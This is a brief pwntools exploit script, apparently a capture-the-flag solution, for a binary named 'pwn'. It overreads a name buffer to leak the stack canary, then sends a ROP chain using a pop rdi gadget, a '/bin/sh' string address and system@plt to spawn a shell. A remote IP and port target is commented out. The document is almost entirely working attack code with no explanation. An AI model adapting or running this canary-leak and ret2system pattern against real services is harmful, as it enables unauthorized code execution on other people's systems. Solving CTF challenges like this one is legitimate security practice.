from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=remote("8.130.35.16",55000)
elf=ELF("../dist/pwn")
s=process("../dist/pwn")
rdi=0x40138b
binsh=0x404068
system=0x401050
s.sendafter(b"Ur name plz?\n",b"a"*0x19)
s.recvuntil(b"a"*0x19)
canary=u64(b"\x00"+s.recv(7))
success(hex(canary))
s.sendafter(b"right?",b"Y")
s.sendafter(b"plz.\n",flat([
    b"a"*0x18,canary,0x404500,rdi+1,rdi,binsh,elf.plt.system
]))
s.interactive()
